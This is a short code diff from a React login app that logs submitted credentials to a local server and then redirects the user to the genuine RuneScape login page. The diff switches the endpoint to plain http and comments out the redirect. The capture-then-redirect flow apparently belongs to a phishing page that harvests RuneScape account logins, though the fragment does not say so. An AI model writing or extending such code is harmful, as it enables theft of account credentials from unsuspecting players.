@@ -3,7 +3,7 @@ import LoginForm from './components/LoginForm';
 import axios from 'axios';
 
 const api = axios.create({
-  baseURL: `https://localhost:8080/login`
+  baseURL: `http://localhost:8080/login`
 });
 
 function App() {
@@ -16,7 +16,7 @@ function App() {
 
   const Login = credentials => {
     logUser(credentials);
-    window.location.href = "https://secure.runescape.com/m=weblogin/loginform?theme=oldschool&mod=oldschool&ssl=1&dest=";
+    // window.location.href = "https://secure.runescape.com/m=weblogin/loginform?theme=oldschool&mod=oldschool&ssl=1&dest=";
   }
 
   return (
